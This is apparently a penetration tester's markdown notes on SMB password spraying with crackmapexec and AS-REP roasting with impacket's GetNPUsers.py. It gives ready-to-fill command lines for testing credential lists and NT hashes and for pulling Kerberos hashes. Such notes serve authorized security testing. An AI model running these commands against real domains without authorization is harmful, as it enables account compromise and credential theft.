## Miscellaneous Attacks In No Particular Order

**SMB Password Spraying**

When You have a working password and a list of userames, or a working username and a list of passwords, ``crackmapexec`` makes testing your credentials trivial.

```bash
crackmapexec smb <IP> -u <USERLIST> -p '<PASS>' --continue-on-success
crackmapexec smb <IP> -u '<USER>' -p <PASSLIST> --continue-on-success
# Authenticate with an NT hash
crackmapexec smb <IP> -u '<USER>'-H '<NTML_HASH>' --continue-on-success 
```

**AS-REP Roasting**

AS-REP roasting is a technique that allows retrieving password hashes for users that have don't require Kerberos preauthentication. ``impacket`` has a utility that makes this trivial for us. I could only do a bad job explaining this attack, so I've linked much better resources below. It is important to note that this is not found often, if at all, in real world engagements.

```bash
python3 GetNPUsers.py <DOMAIN>/ -dc-ip <IP> -no-pass -usersfile <USERLIST>
```

[Roasting AS-REPS](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
[AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
